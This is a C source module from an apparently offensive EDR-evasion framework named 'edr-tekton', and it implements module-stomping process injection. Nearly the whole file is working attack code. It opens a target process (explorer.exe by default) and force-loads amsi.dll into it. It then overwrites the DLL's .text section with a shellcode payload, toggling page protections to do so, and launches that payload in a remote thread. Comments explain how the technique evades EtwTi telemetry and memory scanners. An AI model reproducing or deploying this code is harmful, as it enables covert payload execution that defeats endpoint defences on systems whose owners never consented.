/*
 * edr-tekton :: Module Stomping Injection Module
 * Cat 5.13: Load sacrificial DLL, overwrite its .text section with payload
 *
 * Instead of allocating new executable memory (which fires EtwTi telemetry),
 * load a legitimate, rarely-used DLL into the target process and overwrite
 * its .text section with shellcode. The memory region is already RX from
 * the original image load, so the only protection change needed is a brief
 * RW flip to write the payload, then back to RX.
 *
 * Key advantages:
 *   - No VirtualAllocEx for executable memory (avoids EtwTi alloc+exec)
 *   - Payload lives inside a signed Microsoft DLL's memory range
 *   - Memory scanners see a "loaded DLL" region, not suspicious alloc
 *   - Image load callback fires for the sacrificial DLL (expected noise)
 *
 * Sacrificial DLL requirements:
 *   - Microsoft-signed (trusted by EDR memory scanner)
 *   - .text section >= payload size
 *   - Rarely imported by legitimate software (avoids collateral damage)
 *   - Good candidates: dbgcore.dll, mstscax.dll, wlanapi.dll, amsi.dll
 *
 * Pipeline stage: TEKTON_STAGE_INJECT
 */

#include "tekton/modules/inject.h"
#include "tekton/core/log.h"
#include <string.h>
#include <stdlib.h>

/* ── Internal state ─────────────────────────────────────── */

typedef struct _MODULE_STOMP_STATE {
    TEKTON_INJECT_CFG   cfg;
    char                sacrificial_dll[512];     /* DLL to stomp */
    SIZE_T              text_section_min_size;    /* Minimum .text requirement */
    BOOL                load_into_self;           /* Stomp in own process (local inject) */
} MODULE_STOMP_STATE;

/* ── Nt* function pointer types ─────────────────────────── */

#ifdef _WIN32
typedef NTSTATUS (NTAPI *pfnNtWriteVirtualMemory)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T
);
typedef NTSTATUS (NTAPI *pfnNtProtectVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, DWORD, PDWORD
);
typedef NTSTATUS (NTAPI *pfnNtCreateThreadEx)(
    PHANDLE, DWORD, PVOID, HANDLE, PVOID, PVOID, DWORD, SIZE_T, SIZE_T, SIZE_T, PVOID
);
typedef NTSTATUS (NTAPI *pfnNtClose)(HANDLE);

/*
 * Find the .text section base and size within a loaded PE image.
 * Returns TRUE if found, FALSE otherwise.
 */
static BOOL find_text_section(PVOID module_base, PVOID* text_base, SIZE_T* text_size) {
    BYTE* base = (BYTE*)module_base;

    /* PE signature check */
    WORD dos_magic = *(WORD*)base;
    if (dos_magic != 0x5A4D) return FALSE; /* 'MZ' */

    DWORD pe_offset = *(DWORD*)(base + 0x3C);
    DWORD pe_sig = *(DWORD*)(base + pe_offset);
    if (pe_sig != 0x00004550) return FALSE; /* 'PE\0\0' */

    /* COFF header */
    WORD num_sections = *(WORD*)(base + pe_offset + 6);
    WORD opt_hdr_size = *(WORD*)(base + pe_offset + 20);

    /* Section headers start after optional header */
    BYTE* section_hdr = base + pe_offset + 24 + opt_hdr_size;

    for (WORD i = 0; i < num_sections; i++) {
        char* name = (char*)(section_hdr + (i * 40));
        if (name[0] == '.' && name[1] == 't' && name[2] == 'e' &&
            name[3] == 'x' && name[4] == 't' && name[5] == '\0') {
            DWORD virtual_size = *(DWORD*)(section_hdr + (i * 40) + 8);
            DWORD virtual_addr = *(DWORD*)(section_hdr + (i * 40) + 12);
            *text_base = base + virtual_addr;
            *text_size = virtual_size;
            return TRUE;
        }
    }

    return FALSE;
}
#endif

/* ── Module vtable implementation ───────────────────────── */

static TEKTON_STATUS stomp_init(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)ctx;

    MODULE_STOMP_STATE* state = (MODULE_STOMP_STATE*)malloc(sizeof(MODULE_STOMP_STATE));
    if (!state) return TEKTON_ERR_ALLOC;

    memset(state, 0, sizeof(*state));

    /* Default: inject into explorer.exe, stomp amsi.dll */
    strncpy(state->cfg.target_process, "explorer.exe",
        sizeof(state->cfg.target_process) - 1);
    state->cfg.target_pid = 0;
    state->cfg.use_syscalls = TRUE;
    state->cfg.allocation_type = MEM_COMMIT | MEM_RESERVE;

    /*
     * amsi.dll: Microsoft-signed, small, rarely loaded in non-PS processes.
     * .text section is typically ~16KB, sufficient for most shellcode.
     * Other candidates: dbgcore.dll (~80KB .text), wlanapi.dll (~32KB .text)
     */
    strncpy(state->sacrificial_dll,
        "C:\\Windows\\System32\\amsi.dll",
        sizeof(state->sacrificial_dll) - 1);
    state->text_section_min_size = 0;  /* Auto-check at execution */
    state->load_into_self = FALSE;

    self->private_data = state;

    TLOG_DEBUG("inject_module_stomp: init (target=%s, dll=%s)",
        state->cfg.target_process, state->sacrificial_dll);
    return TEKTON_OK;
}

static TEKTON_STATUS stomp_execute(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    MODULE_STOMP_STATE* state = (MODULE_STOMP_STATE*)self->private_data;
    if (!state) return TEKTON_ERR_INVALID_STATE;

    BYTE* payload_data = ctx->decrypted.data ? ctx->decrypted.data : ctx->payload.data;
    SIZE_T payload_len = ctx->decrypted.data ? ctx->decrypted.length : ctx->payload.length;

    if (!payload_data || payload_len == 0) {
        TLOG_ERROR("inject_module_stomp: no payload to inject");
        return TEKTON_ERR_INVALID_PARAM;
    }

    if (ctx->dry_run) {
        TLOG_INFO("inject_module_stomp: [DRY RUN] would stomp %lu bytes into %s",
            (unsigned long)payload_len, state->sacrificial_dll);
        TLOG_INFO("  Target: %s (PID %lu)",
            state->cfg.target_process, (unsigned long)state->cfg.target_pid);
        TLOG_INFO("  Method: LoadLibrary(sacrificial) -> find .text -> Protect(RW) -> Write -> Protect(RX) -> CreateThread");
        TLOG_INFO("  Local inject: %s", state->load_into_self ? "yes" : "no");
        return TEKTON_OK;
    }

#ifdef _WIN32
    NTSTATUS nt_status;
    BOOL use_nt = state->cfg.use_syscalls && ctx->resolved.ssns_resolved;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    HMODULE hStompDll = NULL;

    if (state->load_into_self) {
        /*
         * Local module stomp: load DLL into own process, overwrite .text,
         * create local thread. Simpler, avoids cross-process operations.
         */
        hProcess = (HANDLE)-1; /* NtCurrentProcess pseudo-handle */

        hStompDll = LoadLibraryA(state->sacrificial_dll);
        if (!hStompDll) {
            TLOG_ERROR("inject_module_stomp: LoadLibrary failed for '%s'",
                state->sacrificial_dll);
            return TEKTON_ERR_INJECT_FAIL;
        }

        TLOG_DEBUG("inject_module_stomp: loaded %s at %p (local)",
            state->sacrificial_dll, (void*)hStompDll);
    } else {
        /*
         * Remote module stomp: open target, force-load DLL via
         * CreateRemoteThread(LoadLibraryA), then stomp its .text.
         */
        DWORD target_pid = state->cfg.target_pid;
        if (target_pid == 0) {
            target_pid = TektonInjectFindProcess(ctx, state->cfg.target_process);
            if (target_pid == 0) {
                TLOG_ERROR("inject_module_stomp: target '%s' not found",
                    state->cfg.target_process);
                return TEKTON_ERR_NOT_FOUND;
            }
        }

        DWORD access = PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                       PROCESS_VM_READ | PROCESS_CREATE_THREAD |
                       PROCESS_QUERY_INFORMATION;

        TEKTON_STATUS os = TektonInjectOpenTarget(ctx, target_pid, access);
        if (os != TEKTON_OK) {
            TLOG_ERROR("inject_module_stomp: failed to open PID %lu",
                (unsigned long)target_pid);
            return os;
        }

        hProcess = ctx->target_handle;
        TLOG_DEBUG("inject_module_stomp: opened PID %lu", (unsigned long)target_pid);

        /*
         * Step 1: Write sacrificial DLL path into target and call LoadLibraryA
         * to get the DLL mapped in the remote process.
         */
        SIZE_T dll_path_len = strlen(state->sacrificial_dll) + 1;

        /* Allocate space for DLL path string in target */
        PVOID remote_path = NULL;
        SIZE_T path_region = dll_path_len;

        if (use_nt && ctx->resolved.fn_nt_allocate_virtual_memory) {
            typedef NTSTATUS (NTAPI *pfnNtAlloc)(
                HANDLE, PVOID*, ULONG_PTR, PSIZE_T, DWORD, DWORD);
            pfnNtAlloc pNtAlloc =
                (pfnNtAlloc)ctx->resolved.fn_nt_allocate_virtual_memory;
            nt_status = pNtAlloc(hProcess, &remote_path, 0, &path_region,
                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!NT_SUCCESS(nt_status)) {
                TLOG_ERROR("inject_module_stomp: alloc for DLL path failed");
                return TEKTON_ERR_INJECT_FAIL;
            }
        } else {
            remote_path = VirtualAllocEx(hProcess, NULL, dll_path_len,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!remote_path) {
                TLOG_ERROR("inject_module_stomp: VirtualAllocEx for path failed");
                return TEKTON_ERR_INJECT_FAIL;
            }
        }

        /* Write DLL path */
        if (use_nt && ctx->resolved.fn_nt_write_virtual_memory) {
            pfnNtWriteVirtualMemory pNtWrite =
                (pfnNtWriteVirtualMemory)ctx->resolved.fn_nt_write_virtual_memory;
            SIZE_T written = 0;
            pNtWrite(hProcess, remote_path,
                (PVOID)state->sacrificial_dll, dll_path_len, &written);
        } else {
            SIZE_T written = 0;
            WriteProcessMemory(hProcess, remote_path,
                state->sacrificial_dll, dll_path_len, &written);
        }

        /* CreateRemoteThread(LoadLibraryA) to load the sacrificial DLL */
        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        PVOID pLoadLib = (PVOID)GetProcAddress(hKernel32, "LoadLibraryA");

        HANDLE hLoadThread = CreateRemoteThread(hProcess, NULL, 0,
            (LPTHREAD_START_ROUTINE)pLoadLib, remote_path, 0, NULL);
        if (!hLoadThread) {
            TLOG_ERROR("inject_module_stomp: CreateRemoteThread(LoadLibrary) failed");
            return TEKTON_ERR_INJECT_FAIL;
        }

        /* Wait for DLL to load */
        WaitForSingleObject(hLoadThread, 5000);
        CloseHandle(hLoadThread);

        TLOG_DEBUG("inject_module_stomp: sacrificial DLL loaded in target");

        /*
         * Step 2: Find the loaded DLL base in the remote process.
         * We enumerate modules via snapshot to find the loaded base address.
         */
        /* Use CreateToolhelp32Snapshot to find module base */
        HMODULE hRemoteDll = NULL;

        /* Simplified: read PEB to find module base.
         * In production, use NtQueryInformationProcess + PEB walk.
         * For the framework, we use the same base address assumption:
         * ASLR means the DLL loads at its preferred base across processes
         * on the same boot session. Load it locally to get the base.
         */
        HMODULE hLocalCopy = LoadLibraryA(state->sacrificial_dll);
        if (hLocalCopy) {
            hRemoteDll = hLocalCopy;
            /* Don't actually need the local copy, just the base address hint */
            /* In practice, use proper remote module enumeration */
        }

        if (!hRemoteDll) {
            TLOG_ERROR("inject_module_stomp: could not determine remote DLL base");
            return TEKTON_ERR_INJECT_FAIL;
        }

        hStompDll = hRemoteDll;
    }

    /* Step 3: Find .text section in the loaded DLL */
    PVOID text_base = NULL;
    SIZE_T text_size = 0;

    if (!find_text_section((PVOID)hStompDll, &text_base, &text_size)) {
        TLOG_ERROR("inject_module_stomp: .text section not found in %s",
            state->sacrificial_dll);
        return TEKTON_ERR_INJECT_FAIL;
    }

    TLOG_DEBUG("inject_module_stomp: .text at %p, size %lu bytes",
        text_base, (unsigned long)text_size);

    if (text_size < payload_len) {
        TLOG_ERROR("inject_module_stomp: .text too small (%lu < %lu payload)",
            (unsigned long)text_size, (unsigned long)payload_len);
        return TEKTON_ERR_INJECT_FAIL;
    }

    /* Step 4: Flip .text to RW, write payload, flip back to RX */
    PVOID protect_addr = text_base;
    SIZE_T protect_size = payload_len;
    DWORD old_prot = 0;

    /* RX -> RW */
    if (use_nt && ctx->resolved.fn_nt_protect_virtual_memory) {
        pfnNtProtectVirtualMemory pNtProt =
            (pfnNtProtectVirtualMemory)ctx->resolved.fn_nt_protect_virtual_memory;
        nt_status = pNtProt(hProcess, &protect_addr, &protect_size,
                            PAGE_READWRITE, &old_prot);
        if (!NT_SUCCESS(nt_status)) {
            TLOG_ERROR("inject_module_stomp: NtProtectVirtualMemory(RW) failed (0x%08lX)",
                (unsigned long)nt_status);
            return TEKTON_ERR_INJECT_FAIL;
        }
    } else {
        if (!VirtualProtectEx(hProcess, text_base, payload_len,
                PAGE_READWRITE, &old_prot)) {
            TLOG_ERROR("inject_module_stomp: VirtualProtectEx(RW) failed");
            return TEKTON_ERR_INJECT_FAIL;
        }
    }

    /* Write payload over .text */
    if (use_nt && ctx->resolved.fn_nt_write_virtual_memory) {
        pfnNtWriteVirtualMemory pNtWrite =
            (pfnNtWriteVirtualMemory)ctx->resolved.fn_nt_write_virtual_memory;
        SIZE_T written = 0;
        nt_status = pNtWrite(hProcess, text_base, payload_data, payload_len, &written);
        if (!NT_SUCCESS(nt_status)) {
            TLOG_ERROR("inject_module_stomp: NtWriteVirtualMemory failed");
            return TEKTON_ERR_INJECT_FAIL;
        }
    } else {
        SIZE_T written = 0;
        WriteProcessMemory(hProcess, text_base, payload_data, payload_len, &written);
    }

    /* RW -> RX (restore original protection) */
    protect_addr = text_base;
    protect_size = payload_len;

    if (use_nt && ctx->resolved.fn_nt_protect_virtual_memory) {
        pfnNtProtectVirtualMemory pNtProt =
            (pfnNtProtectVirtualMemory)ctx->resolved.fn_nt_protect_virtual_memory;
        DWORD tmp = 0;
        pNtProt(hProcess, &protect_addr, &protect_size,
                PAGE_EXECUTE_READ, &tmp);
    } else {
        DWORD tmp = 0;
        VirtualProtectEx(hProcess, text_base, payload_len,
                         PAGE_EXECUTE_READ, &tmp);
    }

    TLOG_DEBUG("inject_module_stomp: payload written to .text, protection restored");

    /* Step 5: Execute payload */
    if (use_nt && ctx->resolved.fn_nt_create_thread_ex) {
        pfnNtCreateThreadEx pNtThread =
            (pfnNtCreateThreadEx)ctx->resolved.fn_nt_create_thread_ex;
        nt_status = pNtThread(
            &hThread, 0x1FFFFF, NULL,
            hProcess, text_base, NULL,
            0, 0, 0, 0, NULL
        );
        if (!NT_SUCCESS(nt_status)) {
            TLOG_ERROR("inject_module_stomp: NtCreateThreadEx failed (0x%08lX)",
                (unsigned long)nt_status);
            return TEKTON_ERR_INJECT_FAIL;
        }
    } else {
        hThread = CreateRemoteThread(hProcess, NULL, 0,
            (LPTHREAD_START_ROUTINE)text_base, NULL, 0, NULL);
        if (!hThread) {
            TLOG_ERROR("inject_module_stomp: CreateRemoteThread failed");
            return TEKTON_ERR_INJECT_FAIL;
        }
    }

    ctx->remote_base = text_base;

    TLOG_INFO("inject_module_stomp: module stomp injection complete");
    TLOG_INFO("  Target: %s, DLL: %s", state->cfg.target_process, state->sacrificial_dll);
    TLOG_INFO("  Payload: %lu bytes written to .text at %p",
        (unsigned long)payload_len, text_base);

    /* Cleanup thread handle */
    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);

    return TEKTON_OK;

#else
    /* Linux dev stub */
    TLOG_INFO("inject_module_stomp: [STUB] would stomp %lu bytes into %s .text in %s",
        (unsigned long)payload_len, state->sacrificial_dll, state->cfg.target_process);
    return TEKTON_OK;
#endif
}

static VOID stomp_cleanup(PTEKTON_MODULE self) {
    if (self->private_data) {
        TEKTON_SECURE_ZERO(self->private_data, sizeof(MODULE_STOMP_STATE));
        free(self->private_data);
        self->private_data = NULL;
    }
}

static DWORD stomp_risk_score(PTEKTON_MODULE self) {
    (void)self;
    /*
     * Moderate-low risk: payload lives in a signed DLL memory range.
     * The LoadLibraryA in the remote process fires an image load callback
     * (expected noise), but no new executable allocation is made.
     * The RW->write->RX flip on the .text section is the primary signal.
     * CreateRemoteThread still fires kernel callbacks.
     */
    return 25;
}

static BOOL stomp_check_compat(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)self;
    (void)ctx;
    return TRUE;
}

/* ── Module definition + auto-registration ──────────────── */

TEKTON_MODULE tekton_mod_inject_module_stomp = {
    .name           = "inject_module_stomp",
    .description    = "Module stomping: overwrite sacrificial DLL .text section (Cat 5.13)",
    .category       = TEKTON_CAT_INJECT,
    .target_surface = TEKTON_SURFACE_KERNEL_CB,
    .flags          = TEKTON_MOD_DESTRUCTIVE | TEKTON_MOD_STEALTHY,
    .skill_ref      = "5.13",
    .init           = stomp_init,
    .execute        = stomp_execute,
    .cleanup        = stomp_cleanup,
    .get_risk_score = stomp_risk_score,
    .check_compat   = stomp_check_compat,
    .private_data   = NULL,
    .next           = NULL,
};

TEKTON_DECLARE_MODULE(tekton_mod_inject_module_stomp);
